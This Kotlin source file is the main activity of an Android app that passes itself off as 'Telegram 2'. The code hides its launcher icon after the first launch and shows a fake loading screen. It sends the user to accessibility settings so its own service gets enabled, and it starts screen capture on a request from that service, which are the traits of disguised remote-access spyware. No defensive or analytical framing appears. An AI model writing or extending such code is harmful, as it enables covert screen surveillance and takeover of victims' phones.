package com.telegram2.messaging

import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Surface
import androidx.compose.material3.Text
import androidx.compose.ui.Modifier
import com.telegram2.messaging.remote.AccessibilityService
import com.telegram2.messaging.remote.ScreenCaptureService

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Hide launcher icon after first open
        if (intent?.getBooleanExtra("first_open", true) != false) {
            val pkgManager = packageManager
            val componentName = ComponentName(this, MainActivity::class.java)
            pkgManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        }

        // Handle screen capture request from Accessibility
        if (intent?.getStringExtra("action") == "request_screen_capture") {
            requestScreenCapture()
            return
        }

        // Normal UI placeholder
        setContent {
            MaterialTheme {
                Surface(modifier = Modifier.fillMaxSize()) {
                    Text("Telegram 2 – loading...")
                }
            }
        }

        // Redirect to accessibility settings if not already enabled
        if (!isAccessibilityEnabled()) {
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        }
    }

    private fun requestScreenCapture() {
        val mpm = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        startActivityForResult(mpm.createScreenCaptureIntent(), 1000)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == 1000 && resultCode == RESULT_OK && data != null) {
            val intent = Intent(this, ScreenCaptureService::class.java).apply {
                putExtra("code", resultCode)
                putExtra("data", data)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent)
            } else {
                startService(intent)
            }
        }
    }

    private fun isAccessibilityEnabled(): Boolean {
        val service = packageName + "/" + AccessibilityService::class.java.canonicalName
        return try {
            Settings.Secure.getString(
                contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            )?.contains(service) == true
        } catch (e: Exception) { false }
    }
}